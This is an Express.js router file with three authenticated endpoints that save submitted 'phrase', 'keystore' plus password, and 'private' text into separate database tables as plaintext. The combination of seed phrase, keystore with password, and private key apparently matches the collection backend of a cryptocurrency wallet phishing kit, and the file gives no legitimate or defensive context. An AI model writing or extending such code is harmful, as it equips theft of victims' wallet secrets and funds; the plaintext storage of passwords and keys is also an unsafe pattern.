require('dotenv').config();
const express = require('express');
const router = express.Router();
const db = require('../config/db');
const validate = require('../auth/validate');

router.post('/phrase', validate, async (req, res) => {
    const { phrasetext } = req.body;

    if (!phrasetext) {
        return res.status(400).json({ message: 'Phrase text is required' });
    }

    try {
        await db.execute('INSERT INTO phrase (phrasetext) VALUES (?)', [phrasetext]);
        return res.status(201).json({ message: 'Phrase added successfully' });
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

router.post('/keystore', validate, async (req, res) => {
    const { keytext, password } = req.body;

    if (!keytext || !password) {
        return res.status(400).json({ message: 'Keytext and password are required' });
    }

    try {
        await db.execute('INSERT INTO keystore (keytext, password) VALUES (?, ?)', [keytext, password]);
        return res.status(201).json({ message: 'Keystore entry added successfully' });
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

router.post('/private', validate, async (req, res) => {
    const { privatetext } = req.body;

    if (!privatetext) {
        return res.status(400).json({ message: 'Private text is required' });
    }

    try {
        await db.execute('INSERT INTO private (privatetext) VALUES (?)', [privatetext]);
        return res.status(201).json({ message: 'Private entry added successfully' });
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

module.exports = router;
